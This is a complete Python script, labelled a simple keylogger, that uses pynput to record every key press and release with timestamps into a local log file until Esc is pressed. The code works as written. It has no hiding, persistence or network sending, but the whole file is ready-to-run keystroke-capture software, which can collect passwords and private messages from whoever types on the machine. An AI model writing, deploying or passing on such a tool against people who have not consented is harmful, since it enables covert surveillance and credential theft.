from pynput import keyboard
import logging
import argparse

def setup_logging(log_file):
    """
    Configure logging to write to a file.
    """
    logging.basicConfig(
        filename=log_file,
        level=logging.DEBUG,
        format="%(asctime)s: %(message)s"
    )

def on_press(key):
    """
    Callback function to handle key press events.
    """
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    Callback function to handle key release events.
    """
    logging.info(f"Key released: {key}")
    # Stop listener if escape key is pressed
    if key == keyboard.Key.esc:
        return False

def start_keylogger(log_file):
    """
    Start the keylogger
    """
    setup_logging(log_file)
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            listener.join()
        except Exception as e:
            logging.error(f"Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simple keylogger")
    parser.add_argument("--log-file", type=str, default="keylog.txt", help="Log file name")
    args = parser.parse_args()
    start_keylogger(args.log_file)
